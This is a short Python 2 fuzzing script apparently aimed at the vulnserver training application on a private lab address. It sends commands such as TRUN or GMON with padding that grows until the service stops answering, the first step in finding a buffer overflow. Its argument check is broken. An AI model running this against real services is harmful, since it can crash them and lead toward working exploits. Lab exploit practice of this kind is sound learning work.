#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket,os,sys
from time import sleep

buffsize = 100
command = sys.argv[1] + " "

if sys.argv[1] < 2:
    print "Please specify a command to fuzz"
    print "For help, please use type -h"

#if sys.argv[1] eq "-h"
#    print "Fuzzable Commands : STATS RTIME LTIME SRUN TRUN GMON GDOG KSTET GTER HTER LTER KSTAN"

print "[*] Fuzzing Command " + command

while True:
    try:
        buffer = command 
        buffer += "\x41" * buffsize + "\r\n"
       
        #connection strings
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('192.168.10.176',9999))
        #receive banner
        s.recv(1024)

        print "[*] Sending "+ str(buffsize) + " bytes"
        s.send(buffer)
        s.close()
        #sleep(1)

        #increase buffer for crash
        buffsize += 100

    except:
        print "[*] Socket no longer open"
        print "[*] Most recent buffer size " + str(buffsize-100)
        sys.exit("derp")
